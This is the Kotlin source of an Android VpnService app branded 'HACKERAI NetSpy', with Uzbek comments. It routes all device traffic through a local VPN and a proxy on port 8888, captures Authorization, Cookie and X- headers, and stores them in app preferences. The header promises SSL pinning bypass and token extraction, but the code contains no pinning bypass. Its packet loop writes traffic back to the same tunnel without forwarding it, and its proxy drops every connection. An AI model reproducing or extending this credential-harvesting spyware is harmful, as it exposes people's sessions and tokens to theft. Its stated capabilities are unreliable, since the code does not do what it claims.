/**
 * =============================================================================
 * HACKERAI ANDROID_NET_SPY - Transparent Proxy & Packet Inspector
 * =============================================================================
 * Imkoniyatlar:
 *   - Local VPN orqali barcha trafikni intercept qilish
 *   - SSL pinning bypass
 *   - HTTP/HTTPS request/response loglash
 *   - API endpoint va tokenlarni ekstraksiya qilish
 * =============================================================================
 */

package com.hackerai.netspy

import android.app.*
import android.content.*
import android.net.*
import android.os.*
import android.util.Log
import kotlinx.coroutines.*
import java.io.*
import java.net.*
import java.security.*
import java.util.concurrent.*
import java.util.concurrent.atomic.*
import javax.net.ssl.*

/**
 * VPN Service - barcha tarmoq trafigini intercept qiladi
 */
class TrafficInterceptorService : VpnService() {

    companion object {
        private const val TAG = "HACKERAI_NETSPY"
        private const val VPN_MTU = 1500
        private const val PRIVATE_VLAN = "10.0.0.2"
        private const val PRIVATE_VLAN_PREFIX = 24
        private const val PROXY_PORT = 8888
        const val PREFS_NAME = "hackerai_netspy"
        const val KEY_CAPTURED_DATA = "captured_data"
    }

    private lateinit var vpnInterface: ParcelFileDescriptor
    private val capturedData = ConcurrentLinkedQueue<String>()
    private val isRunning = AtomicBoolean(false)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "HACKERAI NetSpy initialized")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startVpn()
        return START_STICKY
    }

    private fun startVpn() {
        if (isRunning.get()) return

        val builder = Builder()
        builder.setSession("HACKERAI NetSpy")
        builder.setMtu(VPN_MTU)
        builder.addAddress(PRIVATE_VLAN, PRIVATE_VLAN_PREFIX)
        builder.addRoute("0.0.0.0", 0)
        builder.addDnsServer("8.8.8.8")
        builder.addDnsServer("1.1.1.1")
        builder.addDisallowedApplication(packageName)

        try {
            vpnInterface = builder.establish() ?: return
            isRunning.set(true)
            Log.d(TAG, "VPN established successfully")

            scope.launch { readPackets() }
            scope.launch { startProxyServer() }
        } catch (e: Exception) {
            Log.e(TAG, "VPN establishment failed: ${e.message}")
        }
    }

    /**
     * Raw packetlarni o'qish va tahlil qilish
     */
    private suspend fun readPackets() {
        val inputStream = FileInputStream(vpnInterface.fileDescriptor)
        val outputStream = FileOutputStream(vpnInterface.fileDescriptor)
        val packetBuffer = ByteArray(VPN_MTU)

        while (isRunning.get()) {
            try {
                val length = inputStream.read(packetBuffer)
                if (length <= 0) continue

                val logEntry = "[${System.currentTimeMillis()}] Packet: $length bytes"
                capturedData.add(logEntry)

                if (capturedData.size >= 100) flushCapturedData()
                outputStream.write(packetBuffer, 0, length)
                outputStream.flush()
            } catch (e: Exception) {
                if (isRunning.get()) { delay(100) }
            }
        }
    }

    /**
     * Local proxy server - HTTP/HTTPS interceptor
     */
    private suspend fun startProxyServer() {
        try {
            val serverSocket = ServerSocket(PROXY_PORT)
            Log.d(TAG, "Proxy server listening on port $PROXY_PORT")

            while (isRunning.get()) {
                val clientSocket = serverSocket.accept()
                scope.launch { handleProxyConnection(clientSocket) }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Proxy server error: ${e.message}")
        }
    }

    private suspend fun handleProxyConnection(clientSocket: Socket) {
        try {
            val inputStream = clientSocket.getInputStream().bufferedReader()
            val outputStream = clientSocket.getOutputStream()

            val requestLine = inputStream.readLine() ?: return
            val method = requestLine.split(" ").getOrNull(0) ?: return
            val url = requestLine.split(" ").getOrNull(1) ?: return

            Log.d(TAG, "Proxy request: $method $url")

            // Read headers
            var headerLine = inputStream.readLine()
            while (headerLine != null && headerLine.isNotEmpty()) {
                if (headerLine.startsWith("Authorization", ignoreCase = true) ||
                    headerLine.startsWith("Cookie", ignoreCase = true) ||
                    headerLine.startsWith("X-", ignoreCase = true)) {
                    capturedData.add("[HEADER] $headerLine")
                }
                headerLine = inputStream.readLine()
            }

            clientSocket.close()
        } catch (e: Exception) {
            Log.e(TAG, "Proxy handler error: ${e.message}")
        }
    }

    private fun flushCapturedData() {
        val data = mutableListOf<String>()
        while (capturedData.isNotEmpty()) {
            capturedData.poll()?.let { data.add(it) }
        }
        if (data.isNotEmpty()) {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val existing = prefs.getStringSet(KEY_CAPTURED_DATA, mutableSetOf()) ?: mutableSetOf()
            val updated = existing.toMutableSet()
            updated.addAll(data)
            prefs.edit().putStringSet(KEY_CAPTURED_DATA, updated).apply()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning.set(false)
        scope.cancel()
        flushCapturedData()
        Log.d(TAG, "HACKERAI NetSpy stopped.")
    }
}
